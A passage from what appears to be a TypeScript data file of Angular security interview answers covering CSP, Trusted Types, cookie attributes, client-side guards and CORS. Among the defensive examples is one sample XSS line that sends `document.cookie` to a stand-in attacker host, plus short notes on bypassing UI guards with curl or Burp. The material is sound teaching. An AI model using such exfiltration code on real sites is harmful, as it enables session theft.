        variant: 'tip',
        text: 'Interview tip: explain WHY it works — "an attacker can make the browser send my cookie, but cannot read it to put it in a header". Then mention the two gotchas: the token is only added for same-origin mutating requests, and the backend must validate it.',
      },
    ],
  },

  'What is a Content Security Policy (CSP) and how do you use it with Angular?': {
    summary:
      'A CSP is an HTTP response header (or `<meta>` tag) that tells the browser which sources of script, style, images, frames and connections are allowed; anything else is blocked. It is a second line of defence: even if an attacker injects markup, inline scripts and scripts from unknown hosts will not run. With Angular you use a strict, nonce- or hash-based policy — the CLI can generate a hash-based one via the `security.autoCsp` build option, and for nonces you put `ngCspNonce` on the root element (or provide `CSP_NONCE`) so Angular can apply the nonce to the styles it inserts.',
    details: [
      {
        type: 'paragraph',
        text: "Old-style allow-list CSPs (`script-src 'self' cdn.example.com`) are easy to bypass through JSONP endpoints or open redirects on allowed hosts. The current recommendation is a **strict CSP**: scripts only run if they carry the right nonce or hash, and `'strict-dynamic'` lets those trusted scripts load their own chunks.",
      },
      { type: 'heading3', text: 'A strict policy for an Angular SPA' },
      {
        type: 'code',
        lang: 'text',
        code: `Content-Security-Policy:
  script-src 'nonce-r4nd0mPerRequest' 'strict-dynamic';
  style-src 'self' 'nonce-r4nd0mPerRequest';
  object-src 'none';
  base-uri 'self';
  connect-src 'self' https://api.bank.example;
  img-src 'self' data: https://cdn.bank.example;
  frame-ancestors 'none';            # clickjacking protection (header only, not <meta>)
  require-trusted-types-for 'script';
  trusted-types angular angular#unsafe-bypass;`,
      },
      { type: 'heading3', text: 'Option 1: nonce (needs a server that renders index.html)' },
      {
        type: 'code',
        lang: 'html',
        code: `<!-- index.html, templated per request by your server / SSR -->
<body>
  <app-root ngCspNonce="r4nd0mPerRequest"></app-root>
  <script nonce="r4nd0mPerRequest" src="main.js" type="module"></script>
</body>`,
      },
      {
        type: 'code',
        lang: 'typescript',
        code: `// Or provide it in code, e.g. read from a global set by the server
import { CSP_NONCE } from '@angular/core';

bootstrapApplication(AppComponent, {
  providers: [{ provide: CSP_NONCE, useValue: (globalThis as any).myNonce }],
});
// Angular uses this nonce on the <style> elements it inserts for component styles`,
      },
      { type: 'heading3', text: 'Option 2: hash-based autoCsp (static hosting)' },
      {
        type: 'code',
        lang: 'json',
        code: `// angular.json → projects.app.architect.build.options
"security": {
  "autoCsp": true
  // or { "unsafeEval": true } only if a library really needs eval
}`,
      },
      {
        type: 'bullets',
        items: [
          "`autoCsp` hashes the scripts in `index.html`, replaces external `<script src>` tags with a small hashed loader, and injects a `<meta http-equiv=\"Content-Security-Policy\">` with `script-src 'strict-dynamic' <hashes>`, `object-src 'none'` and `base-uri 'self'`. It is marked experimental in the schema and only covers scripts — add other directives (and `frame-ancestors`) as real headers on your server/CDN.",
          'A nonce must be random and unique per response — a hard-coded nonce is no protection. Static hosting (S3, a plain CDN) cannot do that, hence hashes.',
          "Avoid `'unsafe-inline'` for scripts and `'unsafe-eval'`: AOT-compiled Angular needs neither. JIT compilation would need eval.",
          'Roll out with `Content-Security-Policy-Report-Only` plus a `report-to` endpoint first; analytics tags and third-party widgets are what usually break.',
        ],
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: frame CSP as "limits the damage of an XSS we missed", mention strict CSP (nonce/hash + strict-dynamic) over host allow-lists, and name the Angular hooks — `ngCspNonce`/`CSP_NONCE` for nonces and `security.autoCsp` for hashes.',
      },
    ],
  },

  'What are Trusted Types and how does Angular support them?': {
    summary:
      'Trusted Types is a browser API, switched on with the CSP directive `require-trusted-types-for \'script\'`, that makes dangerous DOM sinks like `innerHTML`, `script.src` and `eval` reject plain strings — they only accept `TrustedHTML`/`TrustedScript`/`TrustedScriptURL` objects created by a named policy. That turns DOM XSS from "any string anywhere" into "only through a few audited policies". Angular supports it out of the box: its sanitizer output goes through a policy named `angular`, and values you pass through `bypassSecurityTrust*` go through `angular#unsafe-bypass`, so you can allow or forbid the bypass policy in your CSP.',
    details: [
      {
        type: 'paragraph',
        text: 'CSP stops scripts from untrusted sources; Trusted Types closes the DOM-XSS gap inside your own trusted code — a library that does `el.innerHTML = userValue` will throw instead of injecting markup. Browser support is Chromium-based browsers today (Edge, Chrome) with others catching up; in browsers without it the directive is ignored, so it is a free extra layer.',
      },
      { type: 'heading3', text: 'Enabling it' },
      {
        type: 'code',
        lang: 'text',
        code: `Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types angular;                         # strictest: no bypassSecurityTrust* allowed

# If the app legitimately uses bypassSecurityTrust* (e.g. a video iframe):
  trusted-types angular angular#unsafe-bypass;

# Plus any policies your libraries create, and 'default' only if you define one`,
      },
      { type: 'heading3', text: 'What happens in practice' },
      {
        type: 'code',
        lang: 'typescript',
        code: `// ✅ Angular binding — the sanitized value is wrapped by the 'angular' policy
// <div [innerHTML]="product().descriptionHtml"></div>

// ✅ Bypass — allowed only if 'angular#unsafe-bypass' is in trusted-types
this.embed = this.sanitizer.bypassSecurityTrustResourceUrl(videoUrl);

// ❌ Raw sink — the browser throws:
// "This document requires 'TrustedHTML' assignment."
this.host.nativeElement.innerHTML = this.product().descriptionHtml;

// Your own code that genuinely needs a sink defines a small, reviewed policy
const policy = window.trustedTypes?.createPolicy('product-markdown', {
  createHTML: (md: string) => DOMPurify.sanitize(renderMarkdown(md)),
});
el.innerHTML = policy ? (policy.createHTML(md) as unknown as string) : DOMPurify.sanitize(renderMarkdown(md));`,
      },
      {
        type: 'bullets',
        items: [
          'Policy names found in Angular 22.1: `angular` (sanitized HTML and compiler-generated values), `angular#unsafe-bypass` (values from `bypassSecurityTrust*`), and `angular#auto-csp` (the loader script generated by the CLI `autoCsp` option).',
          'Not listing `angular#unsafe-bypass` is a strong guarantee: no code path can use `bypassSecurityTrust*` to reach a sink.',
          'Start with `Content-Security-Policy-Report-Only` — violation reports tell you which libraries still write raw strings to sinks.',
          "Third-party libs must be Trusted-Types-aware or wrapped; check each one's docs for the policy name it creates.",
        ],
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: describe Trusted Types as "type-checking for DOM sinks at runtime" and name Angular\'s two policies, `angular` and `angular#unsafe-bypass`. Leaving the bypass policy out of `trusted-types` is a crisp, concrete hardening step to mention.',
      },
    ],
  },

  'How do the `HttpOnly`, `Secure`, and `SameSite` cookie attributes protect a session?': {
    summary:
      '`HttpOnly` hides the cookie from JavaScript (`document.cookie`), so an XSS cannot read and exfiltrate the session id — though it can still make requests while the page is open. `Secure` means the cookie is only sent over HTTPS, so it cannot be sniffed on the network. `SameSite` controls whether the cookie is sent on cross-site requests: `Strict` never, `Lax` only on top-level GET navigations, `None` always (requires `Secure`) — which is the main browser-level defence against CSRF. Together they protect against theft (HttpOnly, Secure) and misuse (SameSite).',
    details: [
      {
        type: 'paragraph',
        text: 'These are set by the **server** in the `Set-Cookie` header; Angular cannot set or even see an HttpOnly cookie. For where the token should live in the first place, see the token-storage question — this one is about hardening the cookie itself.',
      },
      { type: 'heading3', text: 'A well-configured login cookie' },
      {
        type: 'code',
        lang: 'text',
        code: `HTTP/1.1 200 OK
Set-Cookie: __Host-session=9f8e...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
Set-Cookie: XSRF-TOKEN=r4nd0m; Path=/; Secure; SameSite=Lax      # readable by Angular on purpose`,
      },
      { type: 'heading3', text: 'What each attribute stops — and does not' },
      {
        type: 'bullets',
        items: [
          '**HttpOnly** — stops token *theft* via XSS (`fetch("https://evil.example?c=" + document.cookie)` gets nothing). Does **not** stop CSRF (the browser still attaches it) or an XSS that makes API calls from the victim page.',
          '**Secure** — only sent over HTTPS; blocks network sniffing on public Wi-Fi and protocol-downgrade leaks. Pair with HSTS.',
          "**SameSite=Strict** — never sent cross-site, even when the user clicks a link to your app from an email (they'll land logged out). Good for a banking admin panel.",
          '**SameSite=Lax** — sent on top-level GET navigations, not on cross-site POSTs, iframes or `fetch`. Chromium-based browsers treat cookies without a `SameSite` attribute as `Lax`; set it explicitly anyway because not every browser defaults the same way.',
          '**SameSite=None; Secure** — sent everywhere; needed only for genuinely cross-site setups (embedded widget, API on a different site). Then CSRF tokens become essential.',
          '**`__Host-` prefix** — the browser only accepts it with `Secure`, `Path=/` and no `Domain`, so a compromised subdomain cannot overwrite it.',
          '**Max-Age / Expires** — short session lifetime; omit both for a session cookie that ends with the browser session.',
        ],
      },
      { type: 'heading3', text: 'What the Angular side needs' },
      {
        type: 'code',
        lang: 'typescript',
        code: `// Same origin (app and API behind one domain / reverse proxy): nothing special —
// the browser sends the cookie automatically.

// API on another origin: opt in per request (and the server must reply with
// Access-Control-Allow-Credentials: true and an explicit allowed origin)
this.http.post('https://api.bank.example/transfer', body, { withCredentials: true });`,
      },
      {
        type: 'paragraph',
        text: '"Site" is not "origin": `app.bank.example` and `api.bank.example` are the same *site* (same registrable domain), so `SameSite` cookies flow between them, but they are different *origins* for CORS and for Angular\'s built-in XSRF header.',
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: map each attribute to one threat — HttpOnly → XSS token theft, Secure → network sniffing, SameSite → CSRF — and add the honest caveat that HttpOnly does not make XSS harmless, it just stops the session leaving the browser.',
      },
    ],
  },

  'Why are route guards and hidden buttons not real security?': {
    summary:
      'Because everything in the browser is under the user\'s control: they can edit JavaScript in DevTools, flip a signal, change the stored role, or skip the UI altogether and call the API with curl. Guards and `@if (isAdmin())` decide what the UI *shows*, which is good UX, but the code and the API endpoints are still reachable. Real security is the server checking authentication and authorization on every request, including ownership checks like "does this order belong to this user?".',
    details: [
      {
        type: 'paragraph',
        text: 'The RBAC question covers how to build guards and permission directives. The point here is the threat model: the Angular bundle is shipped to every visitor, so treat it as public documentation of your API.',
      },
      { type: 'heading3', text: 'Ways to walk past a guard' },
      {
        type: 'bullets',
        items: [
          'Call the API directly: the `DELETE /api/users/42` URL is visible in the bundle and the Network tab — no navigation, no guard.',
          "Edit state: set a breakpoint in the guard and return `true`, or change `roles: ['admin']` in the `/me` response with a proxy tool like Burp.",
          'Read the code: lazy chunks behind `canMatch` are not downloaded by the app, but anyone can request the chunk file by name; data and secrets in it are public.',
          'Tamper with a client-stored JWT payload — the UI may believe it; only the server verifies the signature.',
        ],
      },
      { type: 'heading3', text: 'Client: UX only' },
      {
        type: 'code',
        lang: 'typescript',
        code: `// admin.routes.ts — keeps honest users out of screens they can't use
{ path: 'admin', canMatch: [roleGuard], data: { roles: ['admin'] }, loadChildren: () => import('./admin/admin.routes') }

// account.component.html — hides a button
@if (auth.can('accounts:close')) {
  <button (click)="close(account().id)">Close account</button>
}`,
      },
      { type: 'heading3', text: 'Server: the actual check' },
      {
        type: 'code',
        lang: 'typescript',
        code: `// Express-style handler — runs no matter how the request was made
router.delete('/accounts/:id', requireAuth, async (req, res) => {
  const account = await accounts.findById(req.params.id);
  if (!account) return res.sendStatus(404);
  const isOwner = account.ownerId === req.user.id;
  if (!isOwner && !req.user.permissions.includes('accounts:close')) return res.sendStatus(403);
  await accounts.close(account.id);
  res.sendStatus(204);
});`,
      },
      {
        type: 'bullets',
        items: [
          'Check **object-level** access (IDOR): changing `/orders/7` to `/orders/8` must fail for another customer.',
          'Return only the fields the user may see — hiding a column in the table does not hide it in the JSON.',
          'Do not ship admin-only data, feature flags with secrets, or API keys in the bundle.',
          "Handle 401/403 gracefully in an interceptor — the UI's picture of permissions can be stale.",
        ],
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: a one-liner interviewers love — "the frontend decides what to show, the backend decides what is allowed". Follow it with a concrete bypass (curl the endpoint) and the server-side ownership check.',
      },
    ],
  },

  "What is CORS, and why can't you fix a CORS error from the Angular app?": {
    summary:
      'CORS (Cross-Origin Resource Sharing) is how a server tells the browser it may let JavaScript from another origin read its responses. The Same-Origin Policy blocks that by default; the server opts in with `Access-Control-Allow-*` headers, and for non-simple requests the browser first sends an `OPTIONS` preflight. The check is enforced by the browser and configured on the server, so nothing in Angular — no header you add in an interceptor — can grant permission; the fix is server config, or for local development the Angular dev-server proxy, which makes the request same-origin.',
    details: [
      {
        type: 'paragraph',
        text: "An origin is scheme + host + port, so `http://localhost:4200` calling `http://localhost:3000` is cross-origin. When the API doesn't answer with the right headers, the browser hides the response from your code and `HttpClient` emits an `HttpErrorResponse` with `status: 0` — the request may well have reached and run on the server.",
      },
      {
        type: 'flow',
        title: 'Preflight for a JSON POST with credentials',
        code: `sequenceDiagram
  participant A as Angular app (app.shop.example)
  participant B as Browser
  participant API as api.shop.example
  A->>B: http.post('/orders', json, withCredentials)
  B->>API: OPTIONS /orders + Origin + Access-Control-Request-Method: POST
  API-->>B: 204 Allow-Origin: https://app.shop.example, Allow-Credentials: true
  B->>API: POST /orders + cookie
  API-->>B: 201 + Access-Control-Allow-Origin
  B-->>A: response delivered
  Note over B: Missing/wrong header → browser blocks it, Angular sees status 0`,
      },
      { type: 'heading3', text: 'Why Angular cannot fix it' },
      {
        type: 'bullets',
        items: [
          '`Access-Control-Allow-Origin` is a **response** header — adding it to the request in an interceptor does nothing (and often triggers a preflight).',
          "The rule protects the user: if a page could grant itself access, any site could read your bank's API with the victim's cookies.",
          'CORS is not API security: curl and other servers ignore it. Authorization still belongs on the server.',
          'Browser extensions or `--disable-web-security` only change your own machine — never a fix.',
        ],
      },
      { type: 'heading3', text: 'Local development: the dev-server proxy' },
      {
        type: 'code',
        lang: 'json',
        code: `// proxy.conf.json — the dev server forwards /api/* to the backend,
// so the browser only ever talks to localhost:4200 (same origin → no CORS)
{
  "/api": {
    "target": "http://localhost:3000",
    "secure": false,
    "changeOrigin": true
  }
}`,
      },
      {
        type: 'code',
        lang: 'json',
        code: `// angular.json → architect.serve.options (or: ng serve --proxy-config proxy.conf.json)
"proxyConfig": "proxy.conf.json"`,
      },
      {
        type: 'paragraph',
        text: "Then call relative URLs (`this.http.get('/api/orders')`). The proxy exists only in `ng serve`; in production you either serve the app and API from one origin behind a reverse proxy (nginx, a CDN rule, an API gateway) — which also keeps Angular's XSRF header working — or configure CORS on the API with an explicit origin allow-list. Server-side configuration details are in the Node.js security track.",
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: say "CORS is enforced by the browser and configured on the server" first, then give both fixes — proxy.conf.json for local dev, same-origin reverse proxy or an explicit allow-list (never `*` with credentials) in production.',
      },
    ],
  },
};
